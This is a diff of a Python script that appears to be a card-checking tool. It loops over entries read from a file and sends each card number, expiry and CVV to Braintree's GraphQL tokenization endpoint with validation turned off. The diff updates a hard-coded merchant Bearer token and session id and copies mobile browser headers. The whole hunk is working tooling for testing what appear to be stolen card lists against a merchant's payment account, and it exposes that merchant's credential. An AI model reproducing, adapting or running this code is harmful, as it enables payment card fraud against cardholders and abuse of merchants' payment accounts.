@@ -154,48 +154,53 @@ for P in file.readlines():
     #time.sleep(10)
 
     
-    headers = {
-            'authority': 'payments.braintree-api.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUxNzYyMjEsImp0aSI6IjM5MjdjNzYwLTJmZGItNGI1ZS04YzIxLTU1ZmYxNTVmOGVhMSIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.iOrarPisfoDriQ0s4IBvUN_VfoPQPzZlIXWh1YvzYwv7aJIKZjH78AJE_rpd1OSGHsUnrYKpaTLp8DtKQKSs-g',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'referer': 'https://assets.braintreegateway.com/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        }
+    
         
+    headers = {
+        'authority': 'payments.braintree-api.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUyOTc3OTYsImp0aSI6ImMwNDE2NzFiLWE2MTctNGUzZC1iODQxLWE3ODNkNjBkMDI3MSIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.9j64Z2QuhUr4oDxdR53Nne0WslCF7fGVS8ccp4Y4EPqNsYd-WXE_eFs70mwPHn-qq3wrg7EJx5zP_4SdVP-3gw',
+        'braintree-version': '2018-05-10',
+        'content-type': 'application/json',
+        'origin': 'https://assets.braintreegateway.com',
+        'referer': 'https://assets.braintreegateway.com/',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    }
+    
     json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'custom',
-                'sessionId': 'be7a0de6-22a7-4e05-b3fc-d8014361f577',
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': n,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvc,
-                    },
-                    'options': {
-                        'validate': False,
-                    },
+        'clientSdkMetadata': {
+            'source': 'client',
+            'integration': 'custom',
+            'sessionId': 'b89092ff-78c4-4101-b9be-da3adec0e5f2',
+        },
+        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+        'variables': {
+            'input': {
+                'creditCard': {
+                    'number': n,
+                    'expirationMonth': mm,
+                    'expirationYear': yy,
+                    'cvv': cvc,
+                },
+                'options': {
+                    'validate': False,
                 },
             },
-            'operationName': 'TokenizeCreditCard',
-        }
-        
+        },
+        'operationName': 'TokenizeCreditCard',
+    }
+    
     response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+
+    
     try:
         tok = (response.json()['data']['tokenizeCreditCard']['token'])
     except TypeError:
